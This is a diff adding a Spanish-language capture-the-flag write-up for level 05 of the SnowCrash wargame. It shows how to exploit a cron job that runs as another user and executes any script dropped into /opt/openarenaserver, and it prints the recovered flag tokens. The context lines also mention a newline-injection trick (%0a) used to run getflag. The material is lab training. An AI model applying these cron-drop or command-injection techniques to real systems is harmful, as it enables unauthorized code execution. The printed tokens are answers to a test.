@@ -88,3 +88,33 @@ hola
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 
 el %0a es un salto de linea que hace qeu se ejecute getflag despues de echo como si fuese una nueva instrucción.
+
+## level 05
+
+level05@SnowCrash:~$ find / -name level05 2>/dev/null 
+/var/mail/level05
+/rofs/var/mail/level05
+level05@SnowCrash:~$ cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+Esto suena a ser un crontab
+
+el fichero /usr/sbin/openarenaserver tiene lo siguiente dentro:
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+esto significa que ejecutará cualquier fichero que se encuentre en la carpeta /opt/openarenaserver/*
+
+creo un shell que ejecute getflag:
+
+level05@SnowCrash:/var/crash$ cat getflag.sh 
+#!/bin/bash
+/rofs/bin/getflag > /var/crash/flag05
+
+Y en el ichero flag05 aparece
+Check flag.Here is your token : viuaaale9huek52boumoomioc
